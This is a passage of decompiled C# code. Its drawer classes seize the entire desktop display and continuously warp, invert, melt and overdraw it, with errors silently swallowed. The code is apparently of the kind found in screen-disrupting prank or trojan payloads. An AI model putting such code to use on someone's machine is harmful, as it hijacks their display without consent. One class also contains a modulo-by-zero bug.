							byte b4 = (byte)(pixel & 255U);
							byte b5 = (byte)((pixel >> 8) & 255U);
							byte b6 = (byte)((pixel >> 16) & 255U);
							b4 = (byte)(b4 + b >> 1);
							b5 = (byte)(b5 + b2 >> 1);
							b6 = (byte)(b6 + b3 >> 1);
							uint num7 = (uint)((int)b4 | ((int)b5 << 8) | ((int)b6 << 16));
							GDI.SetPixelV(intPtr, j, i, num7);
						}
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(1);
				}
				catch
				{
				}
			}

			// Token: 0x0400003C RID: 60
			private int redrawCounter;

			// Token: 0x0400003D RID: 61
			private static Random r = new Random();

			// Token: 0x0400003E RID: 62
			private int cc;

			// Token: 0x0400003F RID: 63
			private static int ballWidth = 200;

			// Token: 0x04000040 RID: 64
			private static int ballHeight = 200;

			// Token: 0x04000041 RID: 65
			private static int ballPosX = GDI.Drawer5.r.Next(Screen.PrimaryScreen.Bounds.Width - 200);

			// Token: 0x04000042 RID: 66
			private static int ballPosY = GDI.Drawer5.r.Next(Screen.PrimaryScreen.Bounds.Height - 200);

			// Token: 0x04000043 RID: 67
			private static int moveStepX = 10;

			// Token: 0x04000044 RID: 68
			private static int moveStepY = 10;
		}

		// Token: 0x02000012 RID: 18
		private class Drawer6 : GDI.Drawer
		{
			// Token: 0x0600007C RID: 124 RVA: 0x00005A1C File Offset: 0x00003C1C
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					double num = (double)(Screen.PrimaryScreen.Bounds.Width / 1);
					int num2 = Screen.PrimaryScreen.Bounds.Height / 1;
					float num3 = 0f;
					float num4 = 10f;
					float num5 = 10f;
					float num6 = 0f;
					while ((double)num6 < num)
					{
						float num7 = (float)Math.Sin((double)num6);
						this.redrawCounter++;
						int num8 = this.redrawCounter;
						int num9 = (int)(num3 * num5 + num4);
						GDI.BitBlt(intPtr, num8, num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, -this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						bool flag = this.redrawCounter >= this.screenW;
						if (flag)
						{
							this.redrawCounter = 0;
						}
						num3 = num7;
						num6 += 1f;
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000045 RID: 69
			private int redrawCounter;

			// Token: 0x04000046 RID: 70
			private int redrawCounter2;
		}

		// Token: 0x02000013 RID: 19
		private class Drawer7 : GDI.Drawer
		{
			// Token: 0x0600007E RID: 126 RVA: 0x00005BF4 File Offset: 0x00003DF4
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					for (int i = 0; i < this.screenH; i += 2)
					{
						GDI.BitBlt(intPtr, -50, i, this.screenW, 1, intPtr, 0, i, 13369376);
						GDI.BitBlt(intPtr, this.screenW - 50, i, this.screenW, 1, intPtr, 0, i, 13369376);
						GDI.BitBlt(intPtr, -25, i - 1, this.screenW, 1, intPtr, 0, i - 1, 13369376);
						GDI.BitBlt(intPtr, this.screenW - 25, i - 1, this.screenW, 1, intPtr, 0, i - 1, 13369376);
					}
					for (int j = 0; j < this.screenH; j += 2)
					{
						this.cc++;
						GDI.HSL hsl = new GDI.HSL(this.cc % 240, 1f, 0.5f);
						GDI.RGB rgb = GDI.HSLToRGB(hsl);
						Pen pen = new Pen(Color.FromArgb(69, (int)rgb.R, (int)rgb.G, (int)rgb.B), 2f);
						graphics.DrawLine(pen, 0, j, this.screenW, j);
					}
					GDI._BLENDFUNCTION blendfunction = default(GDI._BLENDFUNCTION);
					blendfunction.BlendOp = 0;
					blendfunction.BlendFlags = 0;
					blendfunction.SourceConstantAlpha = 64;
					blendfunction.AlphaFormat = 0;
					GDI.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, this.screenW, this.screenH, blendfunction);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000047 RID: 71
			private int redrawCounter;

			// Token: 0x04000048 RID: 72
			private int cc;
		}

		// Token: 0x02000014 RID: 20
		private class Drawer8 : GDI.Drawer
		{
			// Token: 0x06000080 RID: 128 RVA: 0x00005E44 File Offset: 0x00004044
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					GDI.POINT[] array = new GDI.POINT[3];
					int left = Screen.PrimaryScreen.Bounds.Left;
					int top = Screen.PrimaryScreen.Bounds.Top;
					int right = Screen.PrimaryScreen.Bounds.Right;
					int bottom = Screen.PrimaryScreen.Bounds.Bottom;
					int num = this.random.Next(1, 26);
					int num2 = this.random.Next(-5, 6);
					int num3 = this.random.Next(-5, 6);
					int num4 = this.random.Next(-5, 6);
					int num5 = this.random.Next(-5, 6);
					int num6 = this.random.Next(-5, 6);
					int num7 = this.random.Next(-5, 6);
					for (int i = 0; i < num; i++)
					{
						array[0].X = left - num2;
						array[0].Y = top + num3;
						array[1].X = right - num4;
						array[1].Y = top + num5;
						array[2].X = left + num6;
						array[2].Y = bottom - num7;
						GDI.PlgBlt(intPtr, array, intPtr, left, top, right - left, bottom - top, IntPtr.Zero, 0, 0);
						GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 6684742);
					}
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000049 RID: 73
			private int redrawCounter;
		}

		// Token: 0x02000015 RID: 21
		private class Drawer9 : GDI.Drawer
		{
			// Token: 0x06000082 RID: 130 RVA: 0x00006078 File Offset: 0x00004278
			public unsafe override void Draw(IntPtr hdc)
			{
				try
				{
					Bitmap bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height, PixelFormat.Format32bppArgb);
					Graphics.FromImage(bitmap).CopyFromScreen(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
					Graphics graphics = Graphics.FromImage(bitmap);
					graphics.SmoothingMode = SmoothingMode.HighSpeed;
					graphics.PixelOffsetMode = PixelOffsetMode.HighSpeed;
					float num = 5f;
					num = (100f + num) / 100f;
					num *= num;
					Bitmap bitmap2 = (Bitmap)bitmap.Clone();
					BitmapData bitmapData = bitmap2.LockBits(new Rectangle(0, 0, bitmap2.Width, bitmap2.Height), ImageLockMode.ReadWrite, bitmap2.PixelFormat);
					int height = bitmap2.Height;
					int width = bitmap2.Width;
					for (int i = 0; i < height; i++)
					{
						byte* ptr = (byte*)(void*)bitmapData.Scan0 + i * bitmapData.Stride;
						int num2 = 0;
						for (int j = 0; j < width; j++)
						{
							byte b = ptr[num2];
							byte b2 = ptr[num2 + 1];
							float num3 = (float)ptr[num2 + 2] / 255f;
							float num4 = (float)b2 / 255f;
							float num5 = (float)b / 255f;
							float num6 = ((num3 - 0.5f) * num + 0.5f) * 255f;
							num4 = ((num4 - 0.5f) * num + 0.5f) * 255f;
							num5 = ((num5 - 0.5f) * num + 0.5f) * 255f;
							int num7 = (int)num6;
							num7 = ((num7 > 255) ? 255 : num7);
							num7 = ((num7 >= 0) ? num7 : 0);
							int num8 = (int)num4;
							num8 = ((num8 > 255) ? 255 : num8);
							num8 = ((num8 >= 0) ? num8 : 0);
							int num9 = (int)num5;
							num9 = ((num9 > 255) ? 255 : num9);
							num9 = ((num9 >= 0) ? num9 : 0);
							ptr[num2] = (byte)num9;
							ptr[num2 + 1] = (byte)num8;
							ptr[num2 + 2] = (byte)num7;
							num2 += 4;
						}
					}
					bitmap2.UnlockBits(bitmapData);
					Bitmap bitmap3 = new Bitmap(bitmap2);
					IntPtr hdc2 = Graphics.FromHdc(GDI.GetDC(IntPtr.Zero)).GetHdc();
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc2);
					GDI.SelectObject(intPtr, bitmap3.GetHbitmap());
					for (int k = 0; k < this.screenH; k += 2)
					{
						GDI.BitBlt(intPtr, -1, k, this.screenW, 1, intPtr, 0, k, 13369376);
						GDI.BitBlt(intPtr, this.screenW - 1, k, this.screenW, 1, intPtr, 0, k, 13369376);
						GDI.BitBlt(intPtr, 1, k - 1, this.screenW, 1, intPtr, 0, k - 1, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + 1, k - 1, this.screenW, 1, intPtr, 0, k - 1, 13369376);
					}
					GDI.BitBlt(hdc2, 0, 0, bitmap3.Width, bitmap3.Height, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(hdc2);
					GDI.DeleteObject(intPtr);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x0400004A RID: 74
			private int redrawCounter;
		}

		// Token: 0x02000016 RID: 22
		private class Drawer10 : GDI.Drawer
		{
			// Token: 0x06000084 RID: 132 RVA: 0x00006440 File Offset: 0x00004640
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					float num = 0f;
					float num2 = 0f;
					float num3 = 5f;
					for (float num4 = 0f; num4 < (float)(Screen.PrimaryScreen.Bounds.Height / 10); num4 += 0.1f)
					{
						float num5 = (float)Math.Sin((double)num4);
						this.redrawCounter2++;
						int num6 = this.redrawCounter2;
						int num7 = (int)(num * num3 + num2);
						GDI.BitBlt(intPtr, num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						GDI.BitBlt(intPtr, this.screenW + num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + num7, num6, this.screenW, 1, intPtr, 0, num6, 13369376);
						bool flag = this.redrawCounter2 >= this.screenH;
						if (flag)
						{
							this.redrawCounter2 = 0;
						}
						num = num5;
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.ReleaseDC(intPtr, intPtr2);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x0400004B RID: 75
			private int redrawCounter2;
		}

		// Token: 0x02000017 RID: 23
		private class Drawer11 : GDI.Drawer
		{
			// Token: 0x06000086 RID: 134 RVA: 0x00006614 File Offset: 0x00004814
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					double num = (double)(Screen.PrimaryScreen.Bounds.Width / 1000);
					double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 1000);
					float num3 = 0f;
					float num4 = 0f;
					float num5 = 50f;
					float num6 = 0f;
					while ((double)num6 < num)
					{
						float num7 = (float)Math.Sin((double)num6);
						this.redrawCounter++;
						int num8 = this.redrawCounter;
						int num9 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num8, num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, -this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						bool flag = this.redrawCounter >= this.screenW;
						if (flag)
						{
							this.redrawCounter = 0;
						}
						num3 = num7;
						num6 += 0.001f;
					}
					float num10 = 0f;
					while ((double)num10 < num2)
					{
						float num11 = (float)Math.Sin((double)num10);
						this.redrawCounter2++;
						int num12 = this.redrawCounter2;
						int num13 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						bool flag2 = this.redrawCounter2 >= this.screenH;
						if (flag2)
						{
							this.redrawCounter2 = 0;
						}
						num3 = num11;
						num10 += 0.001f;
					}
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x0400004C RID: 76
			private int redrawCounter;

			// Token: 0x0400004D RID: 77
			private int redrawCounter2;
		}

		// Token: 0x02000018 RID: 24
		private class Drawer12 : GDI.Drawer
		{
			// Token: 0x06000088 RID: 136 RVA: 0x000068D8 File Offset: 0x00004AD8
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					double num = (double)(Screen.PrimaryScreen.Bounds.Width / 1000);
					double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 1000);
					float num3 = 0f;
					float num4 = 0f;
					float num5 = 50f;
					float num6 = 0f;
					while ((double)num6 < num)
					{
						float num7 = (float)Math.Sin((double)num6);
						this.redrawCounter++;
						int num8 = this.redrawCounter;
						int num9 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num8, num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, -this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						bool flag = this.redrawCounter >= this.screenW;
						if (flag)
						{
							this.redrawCounter = 0;
						}
						num3 = num7;
						num6 += 0.001f;
					}
					float num10 = 0f;
					while ((double)num10 < num2)
					{
						float num11 = (float)Math.Sin((double)num10);
						this.redrawCounter2++;
						int num12 = this.redrawCounter2;
						int num13 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						bool flag2 = this.redrawCounter2 >= this.screenH;
						if (flag2)
						{
							this.redrawCounter2 = 0;
						}
						num3 = num11;
						num10 += 0.001f;
					}
					GDI.Drawer12.ballPosX += GDI.Drawer12.moveStepX;
					bool flag3 = GDI.Drawer12.ballPosX < 0 || GDI.Drawer12.ballPosX + GDI.Drawer12.ballWidth > this.screenW;
					if (flag3)
					{
						GDI.Drawer12.moveStepX = -GDI.Drawer12.moveStepX;
					}
					GDI.Drawer12.ballPosY += GDI.Drawer12.moveStepY;
					bool flag4 = GDI.Drawer12.ballPosY < 0 || GDI.Drawer12.ballPosY + GDI.Drawer12.ballHeight > this.screenH;
					if (flag4)
					{
						GDI.Drawer12.moveStepY = -GDI.Drawer12.moveStepY;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 240, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					graphics.FillEllipse(brush, GDI.Drawer12.ballPosX, GDI.Drawer12.ballPosY, GDI.Drawer12.ballWidth, GDI.Drawer12.ballHeight);
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 6684742);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x0400004E RID: 78
			private int redrawCounter;

			// Token: 0x0400004F RID: 79
			private int redrawCounter2;

			// Token: 0x04000050 RID: 80
			private static Random r = new Random();

			// Token: 0x04000051 RID: 81
			private int cc;

			// Token: 0x04000052 RID: 82
			private static int ballWidth = 500;

			// Token: 0x04000053 RID: 83
			private static int ballHeight = 500;

			// Token: 0x04000054 RID: 84
			private static int ballPosX = GDI.Drawer12.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x04000055 RID: 85
			private static int ballPosY = GDI.Drawer12.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000056 RID: 86
			private static int moveStepX = 50;

			// Token: 0x04000057 RID: 87
			private static int moveStepY = 50;
		}

		// Token: 0x02000019 RID: 25
		private class Drawer13 : GDI.Drawer
		{
			// Token: 0x0600008B RID: 139 RVA: 0x00006D2C File Offset: 0x00004F2C
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					Graphics graphics = Graphics.FromHdc(intPtr);
					double num = (double)(Screen.PrimaryScreen.Bounds.Width / 1000);
					double num2 = (double)(Screen.PrimaryScreen.Bounds.Height / 1000);
					float num3 = 0f;
					float num4 = 0f;
					float num5 = 50f;
					float num6 = 0f;
					while ((double)num6 < num)
					{
						float num7 = (float)Math.Sin((double)num6);
						this.redrawCounter++;
						int num8 = this.redrawCounter;
						int num9 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num8, num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						GDI.BitBlt(intPtr, num8, -this.screenH + num9, 1, this.screenH, intPtr, num8, 0, 13369376);
						bool flag = this.redrawCounter >= this.screenW;
						if (flag)
						{
							this.redrawCounter = 0;
						}
						num3 = num7;
						num6 += 0.001f;
					}
					float num10 = 0f;
					while ((double)num10 < num2)
					{
						float num11 = (float)Math.Sin((double)num10);
						this.redrawCounter2++;
						int num12 = this.redrawCounter2;
						int num13 = (int)Math.Round((double)(num3 * num5 + num4));
						GDI.BitBlt(intPtr, num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						GDI.BitBlt(intPtr, -this.screenW + num13, num12, this.screenW, 1, intPtr, 0, num12, 13369376);
						bool flag2 = this.redrawCounter2 >= this.screenH;
						if (flag2)
						{
							this.redrawCounter2 = 0;
						}
						num3 = num11;
						num10 += 0.001f;
					}
					GDI.Drawer13.ballPosX += GDI.Drawer13.moveStepX;
					bool flag3 = GDI.Drawer13.ballPosX < 0 || GDI.Drawer13.ballPosX + GDI.Drawer13.ballWidth > this.screenW;
					if (flag3)
					{
						GDI.Drawer13.moveStepX = -GDI.Drawer13.moveStepX;
					}
					GDI.Drawer13.ballPosY += GDI.Drawer13.moveStepY;
					bool flag4 = GDI.Drawer13.ballPosY < 0 || GDI.Drawer13.ballPosY + GDI.Drawer13.ballHeight > this.screenH;
					if (flag4)
					{
						GDI.Drawer13.moveStepY = -GDI.Drawer13.moveStepY;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 0, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					graphics.FillEllipse(brush, GDI.Drawer13.ballPosX, GDI.Drawer13.ballPosY, GDI.Drawer13.ballWidth, GDI.Drawer13.ballHeight);
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 4457256);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000058 RID: 88
			private int redrawCounter;

			// Token: 0x04000059 RID: 89
			private int redrawCounter2;

			// Token: 0x0400005A RID: 90
			private static Random r = new Random();

			// Token: 0x0400005B RID: 91
			private int cc;

			// Token: 0x0400005C RID: 92
			private static int ballWidth = 500;

			// Token: 0x0400005D RID: 93
			private static int ballHeight = 500;

			// Token: 0x0400005E RID: 94
			private static int ballPosX = GDI.Drawer13.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x0400005F RID: 95
			private static int ballPosY = GDI.Drawer13.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x04000060 RID: 96
			private static int moveStepX = 50;

			// Token: 0x04000061 RID: 97
			private static int moveStepY = 50;
		}

		// Token: 0x0200001A RID: 26
		private class Drawer14 : GDI.Drawer
		{
			// Token: 0x0600008E RID: 142 RVA: 0x0000717C File Offset: 0x0000537C
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, this.random.Next(-10, 10), this.random.Next(-10, 10), 6684742);
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 360, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					IntPtr intPtr3 = GDI.CreateSolidBrush((uint)ColorTranslator.ToWin32(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B)));
					GDI.SelectObject(intPtr, intPtr3);
					GDI.PatBlt(intPtr, 0, 0, this.screenW, this.screenH, CopyPixelOperation.PatInvert);
					GDI._BLENDFUNCTION blendfunction = default(GDI._BLENDFUNCTION);
					blendfunction.BlendOp = 0;
					blendfunction.BlendFlags = 0;
					blendfunction.SourceConstantAlpha = 16;
					blendfunction.AlphaFormat = 0;
					GDI.AlphaBlend(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, this.screenW, this.screenH, blendfunction);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000062 RID: 98
			private int cc;
		}

		// Token: 0x0200001B RID: 27
		private class Drawer15 : GDI.Drawer
		{
			// Token: 0x06000090 RID: 144 RVA: 0x00007320 File Offset: 0x00005520
			public override void Draw(IntPtr hdc)
			{
				try
				{
					IntPtr intPtr = GDI.CreateCompatibleDC(hdc);
					IntPtr intPtr2 = GDI.CreateCompatibleBitmap(hdc, this.screenW, this.screenH);
					GDI.SelectObject(intPtr, intPtr2);
					GDI.BitBlt(intPtr, 0, 0, this.screenW, this.screenH, hdc, 0, 0, 13369376);
					GDI.StretchBlt(intPtr, 0, 0, this.screenW / 2, this.screenH / 2, intPtr, 0, 0, this.screenW, this.screenH, GDI.TernaryRasterOperations.SRCCOPY);
					GDI.StretchBlt(intPtr, this.screenW / 2, 0, this.screenW / 2, this.screenH / 2, intPtr, 0, 0, this.screenW, this.screenH, GDI.TernaryRasterOperations.SRCCOPY);
					GDI.StretchBlt(intPtr, 0, this.screenH / 2, this.screenW / 2, this.screenH / 2, intPtr, 0, 0, this.screenW, this.screenH, GDI.TernaryRasterOperations.SRCCOPY);
					GDI.StretchBlt(intPtr, this.screenW / 2, this.screenH / 2, this.screenW / 2, this.screenH / 2, intPtr, 0, 0, this.screenW, this.screenH, GDI.TernaryRasterOperations.SRCCOPY);
					Graphics graphics = Graphics.FromHdc(intPtr);
					GDI.Drawer15.ballPosX += GDI.Drawer15.moveStepX;
					bool flag = GDI.Drawer15.ballPosX < 0 || GDI.Drawer15.ballPosX + GDI.Drawer15.ballWidth > this.screenW;
					if (flag)
					{
						GDI.Drawer15.moveStepX = -GDI.Drawer15.moveStepX;
					}
					GDI.Drawer15.ballPosY += GDI.Drawer15.moveStepY;
					bool flag2 = GDI.Drawer15.ballPosY < 0 || GDI.Drawer15.ballPosY + GDI.Drawer15.ballHeight > this.screenH;
					if (flag2)
					{
						GDI.Drawer15.moveStepY = -GDI.Drawer15.moveStepY;
					}
					GDI.Drawer15.ballPosX1 += GDI.Drawer15.moveStepX1;
					bool flag3 = GDI.Drawer15.ballPosX1 < 0 || GDI.Drawer15.ballPosX1 + GDI.Drawer15.ballWidth1 > this.screenW;
					if (flag3)
					{
						GDI.Drawer15.moveStepX1 = -GDI.Drawer15.moveStepX1;
					}
					GDI.Drawer15.ballPosY1 += GDI.Drawer15.moveStepY1;
					bool flag4 = GDI.Drawer15.ballPosY1 < 0 || GDI.Drawer15.ballPosY1 + GDI.Drawer15.ballHeight1 > this.screenH;
					if (flag4)
					{
						GDI.Drawer15.moveStepY1 = -GDI.Drawer15.moveStepY1;
					}
					GDI.Drawer15.ballPosX2 += GDI.Drawer15.moveStepX2;
					bool flag5 = GDI.Drawer15.ballPosX2 < 0 || GDI.Drawer15.ballPosX2 + GDI.Drawer15.ballWidth2 > this.screenW;
					if (flag5)
					{
						GDI.Drawer15.moveStepX2 = -GDI.Drawer15.moveStepX2;
					}
					GDI.Drawer15.ballPosY2 += GDI.Drawer15.moveStepY2;
					bool flag6 = GDI.Drawer15.ballPosY2 < 0 || GDI.Drawer15.ballPosY2 + GDI.Drawer15.ballHeight2 > this.screenH;
					if (flag6)
					{
						GDI.Drawer15.moveStepY2 = -GDI.Drawer15.moveStepY2;
					}
					this.cc += 10;
					GDI.HSL hsl = new GDI.HSL(this.cc % 240, 1f, 0.5f);
					GDI.RGB rgb = GDI.HSLToRGB(hsl);
					Brush brush = new SolidBrush(Color.FromArgb((int)rgb.R, (int)rgb.G, (int)rgb.B));
					Pen pen = new Pen(Color.Red);
					PointF pointF = new PointF((float)GDI.Drawer15.ballPosX, (float)GDI.Drawer15.ballPosY);
					PointF pointF2 = new PointF((float)GDI.Drawer15.ballPosX1, (float)GDI.Drawer15.ballPosY1);
					PointF pointF3 = new PointF((float)GDI.Drawer15.ballPosX2, (float)GDI.Drawer15.ballPosY2);
					PointF[] array = new PointF[] { pointF, pointF2, pointF3 };
					graphics.FillPolygon(brush, array);
					GDI.BitBlt(hdc, 0, 0, this.screenW, this.screenH, intPtr, 0, 0, 13369376);
					GDI.DeleteObject(intPtr);
					GDI.DeleteObject(intPtr2);
					Thread.Sleep(this.random.Next(10));
				}
				catch
				{
				}
			}

			// Token: 0x04000063 RID: 99
			private int redrawCounter;

			// Token: 0x04000064 RID: 100
			private int redrawCounter2;

			// Token: 0x04000065 RID: 101
			private static Random r = new Random();

			// Token: 0x04000066 RID: 102
			private int cc;

			// Token: 0x04000067 RID: 103
			private static int ballWidth = 0;

			// Token: 0x04000068 RID: 104
			private static int ballHeight = 0;

			// Token: 0x04000069 RID: 105
			private static int ballPosX = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x0400006A RID: 106
			private static int ballPosY = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Height - 600);

			// Token: 0x0400006B RID: 107
			private static int moveStepX = GDI.Drawer15.r.Next(1, 17);

			// Token: 0x0400006C RID: 108
			private static int moveStepY = GDI.Drawer15.r.Next(1, 17);

			// Token: 0x0400006D RID: 109
			private static int ballWidth1 = 0;

			// Token: 0x0400006E RID: 110
			private static int ballHeight1 = 0;

			// Token: 0x0400006F RID: 111
			private static int ballPosX1 = GDI.Drawer15.r.Next(Screen.PrimaryScreen.Bounds.Width - 600);

			// Token: 0x04000070 RID: 112
